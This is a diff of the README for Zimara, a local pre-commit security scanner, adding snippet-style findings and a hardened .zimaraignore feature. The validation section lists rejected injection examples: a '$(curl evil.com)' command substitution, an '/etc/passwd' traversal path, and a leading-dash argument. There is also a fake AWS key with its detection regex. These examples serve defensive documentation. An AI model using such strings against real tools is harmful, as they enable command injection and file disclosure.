@@ -1,6 +1,6 @@
 # Zimara
 
-**Version:** 0.47.1  
+**Version:** 0.48.0  
 **Status:** Active development — stable for production use  
 **Published by:** Oob Skulden™
 
@@ -9,6 +9,59 @@ Zimara is a local security audit script you run before your code leaves your lap
 It exists to catch the stuff that always bites later: secrets that were “temporary,” files that “weren’t supposed to be committed,” and configs that quietly expose more than you think.
 
 It runs fast, stays local, and doesn’t try to be cleverer than it needs to be.
+
+-----
+
+## What’s New in 0.48.0
+
+**Snippet-Enhanced Findings**
+
+Zimara now shows you exactly where problems are with file:line references and code context:
+
+```
+  Possible Secret
+  File: src/config.js:42
+  ────────────────────────────────────────
+      40 | const config = {
+      41 |   apiUrl: process.env.API_URL,
+  >>  42 |   apiKey: "AKIA00000000EXAMPLE1234",
+      43 |   timeout: 5000
+      44 | };
+  ────────────────────────────────────────
+  Pattern: (AKIA[0-9A-Z]{16}|...)
+  Action: Remove secret, rotate credentials, use env vars
+```
+
+No more hunting through files to find what Zimara flagged.
+
+**.zimaraignore Support (Hardened)**
+
+Sometimes you need to exclude files from scanning — test fixtures with intentional “secrets”, third-party code, generated files. Zimara now supports `.zimaraignore` with security-first design:
+
+```
+# .zimaraignore - patterns to exclude from scanning
+
+# Test fixtures (ok to have fake secrets)
+tests/fixtures/*
+
+# Third-party code
+vendor/*
+node_modules/*
+
+# Generated files
+dist/*
+*.min.js
+```
+
+**Security hardening includes:**
+
+- Character whitelist enforcement (no shell metacharacters)
+- Pattern length limits (200 chars max)
+- Injection prevention (no leading dashes, no `..` traversal)
+- Maximum pattern count (100 patterns)
+- Warnings on overly broad patterns
+
+See the [.zimaraignore section](#zimaraignore-file) below for details.
 
 -----
 
@@ -48,10 +101,9 @@ It does **not** modify files, install tools, or make network calls.
 - **Environment variable misuse patterns** (hardcoded secrets pretending to be env vars)
 - **Execution-safety checks** (so the script itself doesn’t do anything dumb while checking if you’re doing anything dumb)
 
-**Want details on every check?** See [CHECKS.md](CHECKS.md) for complete documentation with remediation steps.
+**Want details on every check?** See <CHECKS.md> for complete documentation with remediation steps.
 
-**Need setup help?** See [INTEGRATION.md](INTEGRATION.md) for Git hooks and CI/CD configuration.
-
+**Need setup help?** See <INTEGRATION.md> for Git hooks and CI/CD configuration.
 
 -----
 
@@ -116,6 +168,13 @@ No flags required to tell it what framework you’re using. It just figures it o
 
 **Typical runtime:** Under 5 seconds for repos under 10,000 files
 
+**Supported environments:**
+
+- Linux (all major distributions)
+- macOS (with Homebrew or MacPorts)
+- Windows WSL 2 (confirmed working - not native Windows)
+- Docker containers (see [INTEGRATION.md](INTEGRATION.md#docker-containers) for usage)
+
 No internet access required. No installs beyond the script itself. No sudo. No telemetry. No “please create an account to continue.”
 
 -----
@@ -137,6 +196,10 @@ mv zimara.sh /usr/local/bin/zimara
 ```
 
 Done.
+
+**Windows users:** Zimara requires bash and Unix tools. Use WSL 2 (recommended) or Docker Desktop. See [INTEGRATION.md - Docker Containers](INTEGRATION.md#docker-containers) for setup instructions.
+
+**Docker users:** No installation needed. See [INTEGRATION.md - Docker Containers](INTEGRATION.md#docker-containers) for container-based usage.
 
 -----
 
@@ -177,6 +240,8 @@ zimara [path] [options]
 |`-o, --only-output`    |Scan build output only, skip source files               |
 |`-v, --verbose`        |More detailed output (useful for debugging)             |
 |`--trace-checks`       |Print ENTER/EXIT markers for each check (deep debugging)|
+|`--snippet-context N`  |Lines of context around findings (default: 3)           |
+|`--no-snippet-pattern` |Don’t show regex patterns in snippet output             |
 |`--version`            |Print version and exit                                  |
 |`-h, --help`           |Show help and exit                                      |
 
@@ -197,6 +262,125 @@ zimara --only-output
 
 # Debug a specific check failure
 zimara --trace-checks --verbose
+
+# More context around findings (5 lines instead of 3)
+zimara --snippet-context 5
+
+# Hide regex patterns in output (cleaner for reports)
+zimara --no-snippet-pattern
+```
+
+-----
+
+## .zimaraignore File
+
+Create a `.zimaraignore` file in your repository root to exclude files from scanning.
+
+### Basic Usage
+
+```
+# .zimaraignore - patterns to exclude from Zimara scans
+
+# Test fixtures with intentional fake secrets
+tests/fixtures/*
+test/mock-data/*
+
+# Third-party code
+vendor/*
+node_modules/*
+bower_components/*
+
+# Build artifacts
+dist/*
+build/*
+*.min.js
+*.bundle.js
+
+# Documentation examples (may contain example keys)
+docs/examples/*
+```
+
+### Pattern Rules
+
+**Supported patterns:**
+
+- Wildcards: `*.js`, `test/*`, `vendor/**`
+- Directories: `node_modules/*`, `dist/*`
+- Extensions: `*.min.js`, `*.map`
+- Specific files: `test-config.js`
+
+**Character whitelist (enforced):**
+
+- Only: `a-z A-Z 0-9 . / - _ *`
+- No shell metacharacters, no spaces, no quotes
+
+**Limits (enforced):**
+
+- Maximum 100 patterns
+- Maximum 200 characters per pattern
+- Patterns validated on load
+
+**Rejected patterns (security):**
+
+- Leading dashes: `--exclude` (argument injection)
+- Path traversal: `../secrets` (directory escape)
+- Absolute paths: `/etc/passwd` (filesystem access)
+
+### Security Features
+
+Zimara’s `.zimaraignore` implementation is hardened against injection attacks:
+
+1. **Character whitelisting** — Only safe characters allowed
+1. **Pattern validation** — Malformed patterns rejected with warnings
+1. **Length limits** — Prevents resource exhaustion
+1. **Injection prevention** — No command execution possible through patterns
+
+**Example security rejection:**
+
+```bash
+# .zimaraignore
+--exclude=secrets.txt    # REJECTED: leading dash (injection)
+../../../etc/passwd      # REJECTED: path traversal
+/var/log/*               # REJECTED: absolute path
+$(curl evil.com)         # REJECTED: invalid characters
+```
+
+Each rejected pattern logs a warning but doesn’t break the scan.
+
+### When to Use .zimaraignore
+
+**Good reasons:**
+
+- Test fixtures with intentional “secrets” (fake keys for testing)
+- Third-party code you don’t control (vendor/, node_modules/)
+- Generated files that trigger false positives
+- Documentation with example credentials
+
+**Bad reasons:**
+
+- Hiding real secrets (fix the root cause instead)
+- Excluding production code (you’re just hiding problems)
+- Working around “annoying” findings (those are the important ones)
+
+### .zimaraignore in CI
+
+The `.zimaraignore` file is committed to your repository, so patterns apply everywhere:
+
+- ✅ Local pre-commit hooks
+- ✅ CI/CD pipelines
+- ✅ Team member machines
+- ✅ Code review automation
+
+This ensures consistent scanning behavior across environments.
+
+**Team adoption tip:** Document why patterns are excluded in comments:
+
+```
+# Third-party OAuth library with test keys (not ours to fix)
+vendor/oauth-sdk/*
+
+# Hugo theme with example API keys in demo content
+themes/example-theme/exampleSite/*
 ```
 
 -----
@@ -249,8 +433,7 @@ Non-interactive mode uses these strictly. Interactive mode will ask nicely befor
 
 ## Git Hooks and CI/CD Integration
 
-This is where Zimara really shines. See [INTEGRATION.md](INTEGRATION.md) for detailed setup guides covering:
-
+This is where Zimara really shines. See <INTEGRATION.md> for detailed setup guides covering:
 
 - Pre-commit and pre-push hooks
 - GitHub Actions, GitLab CI, CircleCI
@@ -335,9 +518,9 @@ If you need enterprise features, fork it. If you want to contribute, keep it sim
 
 ## Documentation
 
-- **<CHECKS.md>** - Complete reference for all 45 security checks
-- **<INTEGRATION.md>** - Git hooks, CI/CD setup, and team adoption
-- **<LICENSE>** - MIT License
+- **CHECKS.md** - Complete reference for all 45 security checks
+- **INTEGRATION.md** - Git hooks, CI/CD setup, and team adoption
+- **LICENSE** - MIT License
 
 -----
 
@@ -395,4 +578,4 @@ Still confused? Open an issue.
 Need consulting? You’re on your own — this is a free tool, not a business.
 
 **Published by Oob Skulden™**  
-The threats you don’t see coming.​​​​​​​​​​​​​​​​
+The threats you don’t see coming.
